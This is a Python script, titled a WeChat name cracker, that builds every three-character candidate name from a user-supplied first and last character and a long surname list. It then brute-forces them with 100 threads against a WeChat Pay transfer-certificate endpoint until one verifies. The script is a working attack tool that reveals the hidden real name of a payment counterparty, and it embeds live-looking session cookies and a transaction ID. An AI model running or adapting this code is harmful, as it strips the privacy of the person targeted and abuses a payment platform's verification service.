import re

print('---双月湾微信破解姓名---\n🟢欢迎使用🟢\n🎉🎉🎉')

raw_surnames = "赵、钱、孙、李、周、吴、郑、王、冯、陈、褚、卫、蒋、沈、韩、杨、朱、秦、尤、许、何、吕、施、张、孔、曹、严、华、金、魏、陶、姜、戚、谢、邹、喻、柏、水、窦、章、云、苏、潘、葛、奚、范、彭、郎、鲁、韦、昌、马、苗、凤、花、方、俞、任、袁、柳、酆、鲍、史、唐、费、廉、岑、薛、雷、贺、倪、汤、滕、殷、罗、毕、郝、邬、安、常、乐、于、时、傅、皮、卞、齐、康、伍、余、元、卜、顾、孟、平、黄、和、穆、萧、尹、姚、邵、湛、汪、祁、毛、禹、狄、米、贝、明、臧、计、伏、成、戴、谈、宋、茅、庞、熊、纪、舒、屈、项、祝、董、梁、杜、阮、蓝、闵、席、季、麻、强、贾、路、娄、危、江、童、颜、郭、梅、盛、林、刁、佳、钟、徐、邱、骆、高、夏、蔡、田、樊、永、胡、凌、霍、虞、立、万、支、柯、蔼、昝、管、卢、莫、经、房、裘、缪、干、解、应、宗、丁、宣、贲、邓、郁、单、杭、洪、包、诸、左、石、淼、崔、吉、钮、龚、程、嵇、邢、滑、裴、陆、荣、翁、荀、羊、於、惠、甄、麴、家、封、芮、羿、朝、储、靳、汲、邴、糜、松、井、段、富、巫、乌、俊、焦、骏、巴、弓、牧、隗、山、谷、车、侯、宓、蓬、全、郗、班、仰、秋、仲、伊、宫、宁、仇、栾、暴、甘、钭、厉、戎、祖、武、符、刘、景、詹、束、龙、叶、幸、司、韶、郜、黎、蓟、薄、印、宿、白、怀、蒲、邰、从、鄂、索、咸、籍、赖、卓、蔺、屠、蒙、池、乔、阴、欎、胥、能、苍、双、闻、莘、党、翟、谭、贡、劳、逄、姬、申、扶、堵、冉、宰、郦、雍、舄、璩、桑、桂、濮、牛、寿、通、边、扈、燕、冀、郏、浦、尚、农、温、别、庄、晏、柴、瞿、阎、充、慕、连、茹、习、宦、艾、鱼、容、向、古、易、慎、戈、廖、庾、终、暨、居、衡、步、都、耿、满、弘、匡、国、文、寇、广、禄、阙、东、殴、殳、沃、利、蔚、越、夔、隆、师、巩、厍、聂、晁、勾、敖、融、冷、訾、辛、阚、那、简、饶、空、曾、毋、沙、乜、养、鞠、须、丰、巢、关、蒯、相、查、後、荆、红、游、竺、权、逯、盖、益、桓、公、仉、督、晋、楚、闫、法、汝、鄢、涂、钦、归、海、岳、帅、缑、亢、况、后、有、琴、商、牟、佘、佴、伯、赏、墨、哈、谯、笪、年、爱、阳、佟、言、福、百、家、姓、终、寸、卓、蔺、屠、蒙、池、乔、阳、郁、胥、能、苍、双、闻、莘、党、翟、谭、贡、劳、逄、姬、申、扶、堵、冉、宰、郦、雍、却、璩、桑、桂、濮、牛、寿、通、边、扈、燕、冀、僪、浦、尚、农、温、别、庄、晏、柴、瞿、阎、充、慕、连、茹、习、宦、艾、鱼、容、向、古、易、慎、戈、庾、终、暨、居、衡、永、耿、满、弘、匡、国、文、寇、广、禄、阙、殳、沃、利、蔚、越、夔、隆、师、巩、厍、勾、敖、融、冷、訾、辛、阚、那、简、饶、毋、沙、乜、养、鞠、须、丰、巢、关、蒯、后、荆、红、游、竺、权、逮、盍、益、桓、公、唱、召、有、舜、丛、岳、寸、贰、皇、侨、彤、竭、端、赫、实、甫、集、象、翠、狂、辟、典、良、函、芒、苦、其、京、中、夕、之、蹇、称、诺、来、多、繁、戊、朴、回、毓、税、荤、靖、绪、愈、硕、牢、买、但、巧、枚、撒、泰、秘、亥、绍、以、壬、森、斋、释、奕、姒、朋、求、羽、用、占、真、穰、翦、闾、漆、贵、代、贯、旁、崇、栋、告、休、褒、谏、锐、皋、闳、在、歧、禾、示、是、委、钊、频、嬴、呼、大、威、昂、律、冒、保、系、抄、定、化、莱、校、么、抗、祢、綦、悟、宏、功、庚、务、敏、捷、拱、兆、丑、丙、畅、苟、随、类、卯、俟、友、答、乙、允、甲、留、尾、佼、玄、乘、裔、延、植、环、矫、赛、昔、侍、度、旷、遇、偶、前、由、咎、塞、敛、受、泷、袭、衅、叔、圣、御、夫、仆、镇、藩、邸、府、掌、首、员、焉、戏、可、智、尔、凭、悉、进、笃、厚、仁、业、肇、资、合、仍、九、衷、哀、刑、俎、仵、圭、夷、徭、蛮、汗、孛、乾、帖、罕、洛、淦、洋、邶、郸、郯、邗、邛、剑、虢、隋、蒿、茆、菅、苌、树、桐、锁、钟、机、盘、铎、斛、玉、线、针、箕、庹、绳、磨、蒉、瓮、弭、刀、疏、牵、浑、恽、势、世、仝、同、蚁、止、戢、睢、冼、种、己、泣、潜、卷、脱、谬、蹉、赧、浮、顿、说、次、错、念、夙、斯、完、丹、表、聊、源、姓、吾、寻、展、出、不、户、闭、才、无、书、学、愚、本、性、雪、霜、烟、寒、少、字、桥、板、斐、独、千、诗、嘉、扬、善、揭、昊、祈、析、赤、紫、青、柔、刚、奇、拜、佛、陀、弥、阿、素、长、僧、隐、仙、隽、宇、祭、酒、淡、塔、琦、闪、始、星、南、天、接、波、碧、速、禚、腾、潮、镜、似、澄、潭、謇、纵、渠、奈、风、春、濯、沐、茂、英、兰、檀、藤、枝、检、生、折、登、驹、骑、貊、虎、肥、鹿、雀、野、皓、禽、飞、节、宜、鲜、粟、栗、豆、帛、官、布、衣、藏、宝、钞、银、门、盈、庆、喜、及、普、建、营、巨、望、希、道、载、声、漫、浩、犁、力、贸、勤、革、改、兴、亓、睦、修、信、闽、北、守、坚、勇、汉、练、尉、士、旅、五、令、将、旗、军、行、奉、敬、恭、仪、母、堂、丘、义、礼、慈、孝、理、伦、卿、问、永、辉、位、让、尧、依、犹、介、承、市、所、苑、杞、剧、第、零、谌、招、续、达、忻、六、鄞、战、迟、候、宛、励、粘、萨、邝、覃、辜、志、初、楼、城、区、局、台、原、考、妫、纳、泉、老、清、德、卑、过、麦、曲、竹、百、福、言、佟、爱、年、笪、谯、哈、墨、赏、伯、佴、佘、牟、商、琴、后、况、亢、缑、帅、海、归、钦、鄢、汝、法、闫、楚、晋、督、仉、盖、逯、库、郏、逢、阴、薄、厉、稽、开、光、操、瑞、眭、泥、运、摩、伟、铁、迮"


def clean_surnames(raw):
    surnames = raw.split('、')
    cleaned = set()
    for s in surnames:
        chinese_only = re.sub(r'[^\u4e00-\u9fff]', '', s)
        if len(chinese_only) == 1:
            cleaned.add(chinese_only)
    return sorted(cleaned)


valid_surnames = clean_surnames(raw_surnames)

first = input("请输入名字的第一个字:").strip()
last = input("请输入名字的最后一个字:").strip()

names = [f"{first}{middle}{last}" for middle in valid_surnames]

with open('文文查档.txt', 'w', encoding='utf-8') as f:
    f.write('\n'.join(names))

print(f"已生成{len(names)}个名字,保存至文文查档.txt")
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

URL = "https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan"
HEADERS = {
    "Host": "payapp.wechatpay.cn",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Fetch-Site": "same-origin",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Content-Type": "application/json;charset=utf-8",
    "Origin": "https://payapp.wechatpay.cn",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.57(0x1800392f) NetType/WIFI Language/zh_CN",
    "Referer": "https://payapp.wechatpay.cn/transferbillcertificate/jumphomepage?outtradeno=1000050001202411230728526999049&amount=1004&scene=0&exportkey=n_ChQIAhIQTiu6v2APNmkIlJyn5OUP0RLnAQIE97dBBAEAAAAAADUQMrIzdKgAAAAOpnltbLcz9gKNyK89dVj0S5nS04R5XFm28nLGTuQKAhs9W6jgvFgEZ79q%2BRJi4zeEkoGDO14r6tGcWtFsW6EFD%2BWQU7i50N5%2FqGaXTDKJVckfiVF573MWtzwgzgtN4Sjy7KRcVz96VywdpXxxS2Ke8siym9iDWSf52vhXmz%2BAaWi3kzY5lEU6Wn8FipvF%2B5wCTKzS6r4zotNdp9aN98LuSTDdkGqWl%2BOBY%2FjR1j2x8pIMXXEgrC%2FQc%2FPrOmHRMKvQlCYM4cQ2KRo32YBZVtcrsA%3D%3D&wx_header=0",
    "Cookie": "ek_sid=Mvp8lwgBEAEaIAgCEhwxNzQ1MDUwOTI2MzQ2MTg4Njg4MHZZTXluQklVIhgIAxIUCAMSEHUYUNSof2kPY41bggX9wbMq4AEAAAAArvBSGUD2aTR8nmeTJI83BfwrrnU9U0qC-T_TY8pJjpB6NFsRAyVyCUBokvAwxvVusTXW5oL2tqbJAqMuJuUndokD6J6xGYaloZQD6jTNL_pvZVDssHezXr5Ox5NOsCyN-dCtZMLhlIFcXIpwQ06laxaLt4pRtKGZy87WfQyd3lDM5Z5jbJV_snFHUhEUHL_pTq_Gl00NCMTbBgAD8awP0MuUpLq-tz4xAygYPKRsFUyWYq9mZqQtT5nzkwo5eWx_rCm376bFS-6cGGtwYsRzD4kbcN_WEYHinGWuzw; uin_session=AATYe5sBAAABAAAAAAB9LvTUgs_Nim8BLl0DaCAAAACqnUfKdv170NlP8zhyT7XsHBpMuqNUE189-3R8m2IzDElap-umbe4DcKX2PDxWALS75VuUfNsQQZOUQhe_C_vKPjlnU9ZaaLbu02lt4B4LJOs9ZJer05GhddUQMZ45aYBRrAcnbrK1odjlaPUKJc1YiF1lo-3DnfGgmOsgIYDimsnCJm4BTYj9QBCgAlGNNWz6Esvp4-w23Fb8cltO; wxp_log_uid=BgAAyfMNfy6DwHvPistCTm86%2BoU0m7MRrS8Ir%2Bw%3D",
}
THREAD_POOL_SIZE = 100
success_flag = False
success_name = None
total_valid_names = 0
verified_count = 0
start_time = time.time()


def load_names():
    global total_valid_names
    names = []
    try:
        with open("文文查档.txt", "r", encoding="utf-8") as f:
            names = [line.strip() for line in f if line.strip()]
        total_valid_names = len(names)
        return names
    except FileNotFoundError:
        print("错误:未找到文文查档.txt文件")
        return []
    except Exception as e:
        print(f"文件读取错误:{str(e)}")
        return []


def send_request(name):
    data = {"respondent_true_name": name}
    try:
        response = requests.post(
            URL,
            json=data,
            headers=HEADERS,
            timeout=5
        )
        return response.json()
    except Exception as e:
        return None


def verify_name(index, name):
    response = send_request(name)
    if not response:
        return (index, name, "验证失败(网络错误)")

    errcode = response.get("errcode", -1)
    return (index, name, "成功" if errcode == 0 else "失败")


def main():
    global start_time, success_flag, success_name, verified_count
    names = load_names()
    if not names:
        return

    print(f"总共读取到{total_valid_names}个有效名字")
    start_time = time.time()

    results = [None] * total_valid_names
    futures = [None] * total_valid_names

    with ThreadPoolExecutor(max_workers=THREAD_POOL_SIZE) as executor:
        for i, name in enumerate(names):
            futures[i] = executor.submit(verify_name, i, name)

        for future in as_completed(futures):
            if success_flag:
                for f in futures:
                    if not f.done():
                        f.cancel()
                break
            index, name, status = future.result()
            verified_count += 1
            results[index] = status

            if status == "成功":
                success_flag = True
                success_name = name

    for i in range(total_valid_names):
        if results[i] is None:
            continue
        status = results[i]
        status_icon = "✅✅✅" if status == "成功" else "❌"
        print(f"{i + 1}.{names[i]}-核验{status}{status_icon}")
        if status == "成功":
            break

    end_time = time.time()
    total_time = end_time - start_time

    if success_flag:
        print(f"验证成功的结果为:{success_name}")
    else:
        print(f"没有验证成功的结果,共验证{verified_count}个名字")

    print(f"总耗时:{total_time:.2f}秒")


if __name__ == "__main__":
    main()
